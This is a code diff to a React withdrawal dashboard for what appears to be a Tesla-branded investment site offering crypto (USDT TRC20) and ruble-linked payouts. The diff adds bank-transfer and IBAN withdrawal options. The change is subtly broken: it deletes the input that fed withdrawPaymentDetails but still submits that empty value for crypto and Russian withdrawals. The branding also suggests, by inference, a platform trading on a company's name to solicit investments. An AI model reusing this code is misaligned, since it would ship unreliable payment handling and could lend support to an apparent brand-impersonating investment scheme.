@@ -20,7 +20,9 @@ import PaymentDetails from '@/components/PaymentDetails';
 import CryptoPaymentDetails from '@/components/CryptoPaymentDetails';
 import InvestmentCountrySelector from '@/components/InvestmentCountrySelector';
 import DashboardSkeleton from '@/components/DashboardSkeleton';
+import WithdrawalBankingFields from '@/components/WithdrawalBankingFields';
 import teslaLogo from '@/assets/tesla-logo-red.png';
+import { countryBankingSystems } from '@/data/countryBankingSystems';
 
 // Create notification sound using Web Audio API
 const createNotificationSound = () => {
@@ -110,17 +112,32 @@ const USD_TO_RUB = 96.5;
 const STORAGE_KEY_INVEST_AMOUNT = 'tesla_invest_amount';
 const STORAGE_KEY_SHOW_PAYMENT = 'tesla_show_payment';
 
-// Base withdrawal methods - phone (SBP) only available for Russia
+// Base withdrawal methods - varies by country
 const getWithdrawalMethods = (country: string) => {
-  const methods = [
-    { code: 'card', name: 'Card', icon: CreditCard, description: 'Bank Card' },
-    { code: 'crypto', name: 'Crypto', icon: Bitcoin, description: 'USDT TRC20' },
-  ];
+  const bankingSystem = countryBankingSystems[country];
+  const methods = [];
+  
+  // For countries with IBAN or routing systems, add bank transfer as primary option
+  if (bankingSystem && (bankingSystem.paymentSystem === 'iban' || bankingSystem.paymentSystem === 'routing')) {
+    methods.push({ 
+      code: 'bank_transfer', 
+      name: 'Bank Transfer', 
+      icon: CreditCard, 
+      description: bankingSystem.paymentSystem === 'iban' ? 'IBAN Transfer' : 'Direct Bank Transfer',
+      primary: true
+    });
+  }
+  
+  // Always add card option
+  methods.push({ code: 'card', name: 'Card', icon: CreditCard, description: 'Bank Card' });
   
   // Only add SBP/Phone option for Russia
   if (country === 'RU') {
-    methods.splice(1, 0, { code: 'phone', name: 'Phone', icon: Phone, description: 'Phone Number' });
+    methods.push({ code: 'phone', name: 'Phone', icon: Phone, description: 'Phone Number (SBP)' });
   }
+  
+  // Always add crypto
+  methods.push({ code: 'crypto', name: 'Crypto', icon: Bitcoin, description: 'USDT TRC20' });
   
   return methods;
 };
@@ -555,6 +572,7 @@ const Dashboard = () => {
   const [withdrawMethod, setWithdrawMethod] = useState('');
   const [withdrawCountry, setWithdrawCountry] = useState('');
   const [withdrawPaymentDetails, setWithdrawPaymentDetails] = useState('');
+  const [bankingPaymentDetails, setBankingPaymentDetails] = useState<Record<string, string>>({});
   const [submittingWithdrawal, setSubmittingWithdrawal] = useState(false);
   const [showWithdrawalModal, setShowWithdrawalModal] = useState(false);
   const [withdrawStep, setWithdrawStep] = useState(1);
@@ -830,12 +848,18 @@ const Dashboard = () => {
 
     setSubmittingWithdrawal(true);
     try {
+      // Prepare payment details based on method
+      let paymentDetailsStr = withdrawPaymentDetails;
+      if ((withdrawMethod === 'bank_transfer' || (withdrawMethod === 'card' && Object.keys(bankingPaymentDetails).length > 0)) && withdrawCountry !== 'RU') {
+        paymentDetailsStr = JSON.stringify(bankingPaymentDetails);
+      }
+      
       // Use edge function for server-side validation
       const { data: response, error: fnError } = await supabase.functions.invoke('create-withdrawal', {
         body: {
           amount: parseFloat(withdrawAmount),
           country: withdrawCountry,
-          payment_details: withdrawPaymentDetails,
+          payment_details: paymentDetailsStr,
           payment_method: withdrawMethod
         }
       });
@@ -1453,6 +1477,7 @@ const Dashboard = () => {
                         onClick={() => {
                           setWithdrawMethod(method.code);
                           setWithdrawPaymentDetails('');
+                          setBankingPaymentDetails({});
                         }}
                         className={`w-full flex items-center gap-4 p-4 rounded-xl border transition-all ${
                           withdrawMethod === method.code
@@ -1466,8 +1491,16 @@ const Dashboard = () => {
                           <method.icon className={`w-6 h-6 ${withdrawMethod === method.code ? 'text-green-500' : 'text-muted-foreground'}`} />
                         </div>
                         <div className="text-left">
-                          <p className="font-semibold">{method.code === 'card' ? t('bankCard') : method.code === 'phone' ? t('mobilePayment') : t('cryptoPayment')}</p>
-                          <p className="text-sm text-muted-foreground">{method.code === 'card' ? t('bankCardDesc') : method.code === 'phone' ? t('mobilePaymentDesc') : t('cryptoPaymentDesc')}</p>
+                          <p className="font-semibold">
+                            {method.code === 'bank_transfer' ? t('bankTransfer') || 'Bank Transfer' :
+                             method.code === 'card' ? t('bankCard') : 
+                             method.code === 'phone' ? t('mobilePayment') : t('cryptoPayment')}
+                          </p>
+                          <p className="text-sm text-muted-foreground">
+                            {method.code === 'bank_transfer' ? (countryBankingSystems[withdrawCountry]?.paymentSystem === 'iban' ? 'IBAN / SWIFT Transfer' : 'Direct Bank Transfer') :
+                             method.code === 'card' ? t('bankCardDesc') : 
+                             method.code === 'phone' ? t('mobilePaymentDesc') : t('cryptoPaymentDesc')}
+                          </p>
                         </div>
                       </button>
                     ))}
@@ -1501,43 +1534,31 @@ const Dashboard = () => {
                     </div>
                     <div className="flex justify-between text-sm">
                       <span className="text-muted-foreground">{t('method')}</span>
-                      <span className="capitalize">{withdrawMethod === 'card' ? t('bankCard') : withdrawMethod === 'phone' ? t('mobilePayment') : t('cryptoPayment')}</span>
+                      <span className="capitalize">
+                        {withdrawMethod === 'bank_transfer' ? t('bankTransfer') || 'Bank Transfer' : 
+                         withdrawMethod === 'card' ? t('bankCard') : 
+                         withdrawMethod === 'phone' ? t('mobilePayment') : t('cryptoPayment')}
+                      </span>
                     </div>
                   </div>
 
-                  <div className="space-y-2">
-                    <Label className="text-white">
-                      {withdrawMethod === 'crypto' ? t('enterCryptoAddress') :
-                       withdrawMethod === 'phone' ? t('enterPhoneNumber') : t('enterCardNumber')}
-                    </Label>
-                    {withdrawMethod !== 'crypto' && countryBankingFormats[withdrawCountry] && (
-                      <p className="text-xs text-[#888]">
-                        Format: {withdrawMethod === 'phone' 
-                          ? countryBankingFormats[withdrawCountry].phoneFormat 
-                          : countryBankingFormats[withdrawCountry].cardFormat}
-                        {withdrawMethod === 'card' && ` (${countryBankingFormats[withdrawCountry].cardLength} digits)`}
-                        {withdrawMethod === 'phone' && ` (${countryBankingFormats[withdrawCountry].phoneLength} digits)`}
-                      </p>
-                    )}
-                    <div className="relative">
-                      <Input
-                        type="text"
-                        placeholder={
-                          withdrawMethod === 'crypto' ? 'TRC20 wallet address' :
-                          withdrawMethod === 'phone' 
-                            ? (countryBankingFormats[withdrawCountry]?.phoneFormat || '+X XXX XXX XXXX')
-                            : (countryBankingFormats[withdrawCountry]?.cardFormat || '0000 0000 0000 0000')
-                        }
-                        value={withdrawPaymentDetails}
-                        onChange={(e) => handlePaymentDetailsChange(e.target.value)}
-                        className="h-14 text-lg font-mono font-bold bg-[#1E1E1E] border-[#333] [color:#ffffff_!important] placeholder:text-[#888] focus:border-sky-400 focus:ring-sky-400/20 focus:ring-2"
-                      />
-                    </div>
-                  </div>
+                  {/* Country-specific banking fields */}
+                  <WithdrawalBankingFields
+                    country={withdrawCountry}
+                    method={withdrawMethod}
+                    paymentDetails={bankingPaymentDetails}
+                    onPaymentDetailsChange={setBankingPaymentDetails}
+                  />
 
                   <Button
                     onClick={handleWithdrawSubmit}
-                    disabled={submittingWithdrawal || !withdrawPaymentDetails}
+                    disabled={submittingWithdrawal || (
+                      withdrawMethod === 'crypto' ? !bankingPaymentDetails.cryptoAddress :
+                      withdrawMethod === 'phone' && withdrawCountry === 'RU' ? !bankingPaymentDetails.phoneNumber :
+                      withdrawMethod === 'card' && withdrawCountry === 'RU' ? !bankingPaymentDetails.cardNumber :
+                      withdrawMethod === 'bank_transfer' ? !(bankingPaymentDetails.iban || bankingPaymentDetails.routingNumber || bankingPaymentDetails.sortCode || bankingPaymentDetails.bsbNumber) :
+                      !bankingPaymentDetails.cardNumber && !bankingPaymentDetails.iban
+                    )}
                     className="w-full h-12 bg-gradient-to-r from-green-600 to-green-500 hover:from-green-700 hover:to-green-600 font-semibold text-base"
                   >
                     {submittingWithdrawal ? (
